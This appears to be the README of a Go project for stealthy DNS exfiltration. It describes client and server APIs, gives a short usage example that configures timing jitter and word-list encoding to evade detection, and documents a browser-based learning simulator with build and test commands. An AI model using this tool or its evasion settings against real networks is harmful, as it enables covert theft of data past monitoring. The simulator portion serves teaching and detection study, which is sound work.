# DNS-Communications

DNS-Communications, a repo that performs DNS exfiltration by sending out DNS. Provides both client & server APIs

## How it works

DNS Exfiltration is nothing new, it is a technique used to extract data from a network by encoding it into DNS queries. However, traditional DNS exfiltration methods are often quite easy to detect and block.

This project aims to provide a more stealthy approach to DNS exfiltration by using a custom DNS server which can respond to real DNS queries while also allowing for the exfiltration of data in small chunks over time. The client can send data to the server by encoding it into DNS queries, which are then decoded by the server and stored for later retrieval. You can choose how stealthy you want to be by adjusting settings which let you go from "send it all at once in TXT and NULL records" to "send it in tiny chunks using real domain names and subdomains as part of a code over a few days".

A default expandible word list is provided to facilitate encoding and decoding long strings of data into DNS queries.

---

## Example

```go
var (
    client *client.Client
    err error
)

if client, err = client.NewClient(client.Config{
    Servers: []client.ServerConfig{
        {Host:"example.com", Port:53},
    },
    Stealth: client.StealthConfig{
        Duration: client.DurationConfig{
            Min: 1 * time.Second,
            Max: 5 * time.Second,
        },
        ReplaceWithWordList: true,
    },
}); err != nil {
    log.Fatal(err)
}


if err = client.Exfiltrate([]byte("Hello, World!")); err != nil {
    log.Fatal(err)
}
```

## Learning Utility

This is also a learning utility provided in the form of a web app. It shows the relationship between the exfiltrating client, the server, and provides the ability to get a packet capture of the DNS queries being sent out.
## Web simulator

Requires Go (the version in `go.mod` or newer) and Bun 1.3.5+.

```sh
bun install
bun run dev
```

Open the URL printed by Vite. The **DNS Exfil** tab combines message sending with
an orchestrator inbox. **Packet capture** shows completed hops, search, optional
filters and wire details. **Config** controls regular-query frequency, cover
traffic from the exfil client, total/exfil server counts and each exfil server’s
upstream. The Go/WASM canvas shows a vertical client → firewall → DNS →
orchestrator layout.

The simulation uses fixed 20 ms ticks and 0.8-second links. Devices act only on
packet arrival. An exfil server can resolve ordinary queries directly or forward
them to a normal server; replies travel back through that server and the firewall.
Pause freezes movement and application of pending replies. Reduced motion uses
stationary markers at a packet’s current source.

Regular traffic comes from the embedded [synthetic CSV](serverless/data/dns_traffic.csv):
1,000 rows with 900 good and 100 bad labels. A frequency slider controls the
average random spawn rate, and each spawned query independently picks a client,
DNS server and CSV row. Labels describe synthetic patterns, not actual domain
reputation.
Regular questions fetch **live Cloudflare DNS-over-HTTPS responses** using Go’s
`net/http` and [DNS wire format](https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/make-api-requests/dns-wireformat/).
This needs internet access; DNS answers and network latency vary. Lookups run
asynchronously with a five-second timeout and at most 16 pending requests.
Failures produce visible SERVFAIL replies. Reset cancels pending lookups.

Messages typed into the exfil editor stay inside the simulation and use the real
codec. Sending only to normal servers leaves the transfer incomplete. History
retains the latest 1,500 events and up to 32 transfers. Configuration changes are
locked during an active transfer.

Native `serverless.New()` uses deterministic fixture answers for offline tests;
the browser supplies `serverless.CloudflareDNS`. CI mocks DoH responses while
exercising the actual Go HTTP adapter and browser request path. To check live DNS:

```sh
DNSCOMMS_LIVE_DNS=1 go test ./serverless -run TestCloudflareLive -v
```

Vite builds WASM before serving, watches Go files and `go.mod`/`go.sum`, and reloads
the page after a successful rebuild. A Go rebuild resets the form. The matching
`wasm_exec.js` comes from the active Go installation. Generated files are ignored.

```sh
bun run build    # Build frontend and WASM into web/dist
bun run preview  # Preview the production build
bun run check    # Frontend formatting, lint, and TypeScript checks
bun run test     # Real Go WASM network tests
go test ./...    # Codec and simulation behavior tests
bunx playwright install chromium
bun run test:browser # Browser smoke test against the production build
```

GitHub Actions runs these checks alongside Go formatting, vet, tests, and builds.
